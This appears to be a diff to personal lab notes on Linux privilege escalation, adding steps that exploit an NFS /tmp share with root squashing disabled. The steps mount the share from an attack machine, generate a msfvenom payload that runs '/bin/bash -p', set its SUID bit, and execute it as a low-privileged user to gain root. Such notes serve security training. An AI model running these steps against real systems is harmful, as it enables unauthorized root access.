@@ -40,6 +40,29 @@ Explanation:
 
 Note that the /tmp share has root squashing disabled.
 
-2.
+2. In attackbox:
+switch to root user.
+
+sudo su
+
+3. as root user of attackbox:
+(a) mkdir /tmp/nfs
+(b) mount -o rw,vers=3 DEBIAN_VM_IM:/tmp /tmp/nfs
+( creates a mount point on AttackBox and mount the /tmp share (update the IP accordingly) )
+
+4. In the attackbox:
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+(It generates a payload and save it in the mounted share )
+
+5. To make the file executable and set SUID bit
+chmod +xs /tmp/nfs/shell.elf
+
+6.In the Debian VM as low privileged user:
+/tmp/shell.elf
+
+get the root shell.
+
+
 
 
